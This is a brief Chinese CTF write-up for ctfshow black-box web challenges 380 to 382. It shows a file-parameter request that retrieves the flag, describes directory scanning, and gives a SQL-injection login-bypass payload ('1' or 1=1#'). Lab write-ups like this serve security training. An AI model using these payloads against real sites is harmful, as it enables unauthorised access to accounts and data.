## CTFSHOW-黑盒测试

### web380

访问page.php，提示：
```php
Notice: Undefined index: id in /var/www/html/page.php on line 16
打开$id.php失败
```

![image-20240918101153122](https://gitee.com/bx33661/image/raw/master/path/image-20240918101153122.png)

```
/page.php?id=flag
```

![image-20250206220554488](https://gitee.com/bx33661/image/raw/master/path/image-20250206220554488.png)

### web381

使用dirsearch没有扫到东西，使用Awvs

![image-20240918103734147](https://gitee.com/bx33661/image/raw/master/path/image-20240918103734147.png)

访问几个可疑目录

![image-20240918103830177](https://gitee.com/bx33661/image/raw/master/path/image-20240918103830177.png)

查看源码

![image-20240918104049278](https://gitee.com/bx33661/image/raw/master/path/image-20240918104049278.png)



### web382

![image-20240918104631465](https://gitee.com/bx33661/image/raw/master/path/image-20240918104631465.png)

万能密码：

```
1' or 1=1#
```

